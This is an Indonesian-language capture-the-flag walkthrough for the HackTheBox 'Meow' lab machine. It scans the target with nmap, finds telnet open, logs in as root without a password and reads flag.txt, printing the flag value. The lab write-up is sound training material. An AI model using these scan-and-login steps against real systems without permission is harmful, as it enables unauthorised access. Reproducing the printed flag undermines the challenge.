# HackTheBox - Starting Point Walkthrough
Created By [Badzlan Nur Dhabith](https://www.linkedin.com/in/badzlannurdhabith/)

## Challenge : Meow
### Steps and Solutions
Pertama lakukan pengecekan apakah sudah ada tunnel ip target, dengan command :
```
ifconfig
```
```
┌──(root㉿localhost)-[~]
└─# ifconfig                                    
...
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.56  netmask 255.255.254.0  destination 10.10.14.56
        inet6 dead:beef:2::1036  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::8e5c:baa2:365b:2370  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1  bytes 48 (48.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
jika sudah ada tun0 berarti kita sudah connect dengan target dengan openvpn

------------------------------------------------------------------------------------------------------

Lalu, cek apakah kita dan target sudah terhubung, dengan command :
```
ping [ip target]
```
```
┌──(root㉿localhost)-[~]
└─# ping 10.129.49.229
PING 10.129.49.229 (10.129.49.229) 56(84) bytes of data.
64 bytes from 10.129.49.229: icmp_seq=1 ttl=63 time=253 ms
64 bytes from 10.129.49.229: icmp_seq=3 ttl=63 time=268 ms
64 bytes from 10.129.49.229: icmp_seq=4 ttl=63 time=257 ms
64 bytes from 10.129.49.229: icmp_seq=5 ttl=63 time=255 ms
--- 10.129.49.229 ping statistics ---
5 packets transmitted, 4 received, 20% packet loss, time 4021ms
rtt min/avg/max/mdev = 253.414/258.182/267.999/5.776 ms
```

------------------------------------------------------------------------------------------------------

• Selanjutnya, lakukan scanning port target untuk melihat port dan service yang open, dengan command :
```
nmap -sV [ip target]
```
```
┌──(root㉿localhost)-[~]
└─# nmap -sV 10.129.49.229        
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-01 23:10 EDT
Nmap scan report for 10.129.49.229
Host is up (0.35s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.22 seconds
```
dari hasil scanning terlihat bahwa port yang open adalah port 23 dengan service telnet

------------------------------------------------------------------------------------------------------

Kemudian, kita coba telnet target untuk melihat file dan direktori target menggunakan command :
```
telnet [ip target]
```
login sebagai root agar bisa masuk tanpa password
```
┌──(root㉿localhost)-[~]
└─# telnet 10.129.49.229                                                                                         
Trying 10.129.49.229...
Connected to 10.129.49.229.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 02 Sep 2022 03:22:51 AM UTC

  System load:           0.08
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             141
  Users logged in:       0
  IPv4 address for eth0: 10.129.49.229
  IPv6 address for eth0: dead:beef::250:56ff:feb9:98fc

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
```

------------------------------------------------------------------------------------------------------

Selanjutnya, kita coba lihat list file dan direktori target dengan command :
```
ls
```
```
root@Meow:~# ls
flag.txt  snap
```
ternyata ada file bernama flag.txt

------------------------------------------------------------------------------------------------------

Lalu open file tersebut dengan command :
```
cat [nama file]
```
```
root@Meow:~# cat flag.txt 
b40abdfe23665f766f9c61ecba8a4c19
```

------------------------------------------------------------------------------------------------------
